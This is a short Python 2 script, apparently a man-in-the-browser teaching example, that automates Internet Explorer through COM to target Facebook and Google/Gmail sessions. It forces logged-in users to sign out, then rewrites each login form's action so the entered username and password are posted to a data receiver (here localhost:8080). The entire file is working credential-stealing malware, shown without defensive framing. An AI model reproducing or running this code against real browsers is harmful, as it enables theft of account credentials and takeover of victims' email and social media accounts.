import time
import urllib
import urlparse
import win32com.client


target_sites  = {}
data_receiver = "http://localhost:8080/"
target_sites["www.facebook.com"] = \
    {"logout_url"      : None,
     "logout_form"     : "logout_form",
     "login_form_index": 0,
     "owned"           : False}
target_sites["accounts.google.com"]  = \
    {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
     "logout_form"      : None,
     "login_form_index" : 0,
     "owned"            : False}
target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]
clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'


if __name__ == '__main__':
    windows = win32com.client.Dispatch(clsid)
    while True:
        for browser in windows:
            url = urlparse.urlparse(browser.LocationUrl)
            if url.hostname in target_sites:
                if target_sites[url.hostname]["owned"]:
                    continue

                # if there is an URL we can just redirect
                if target_sites[url.hostname]["logout_url"]:
                    browser.Navigate(target_sites[url.hostname]["logout_url"])
                    while browser.ReadyState != 4 and browser.ReadyState != "complete":    
                        time.sleep(0.1)
                else:
                    # retrieve all elements in the document
                    full_doc = browser.Document.all
                    for i in full_doc:
                        try:                        
                            if i.id == target_sites[url.hostname]["logout_form"]:
                                i.submit()
                                while browser.ReadyState != 4 and browser.ReadyState != "complete":    
                                    time.sleep(0.1)
                        except:
                            pass
                try:
                    login_index = target_sites[url.hostname]["login_form_index"]
                    login_page = urllib.quote(browser.LocationUrl)
                    browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                    target_sites[url.hostname]["owned"] = True 
                except:
                    pass

            time.sleep(5)
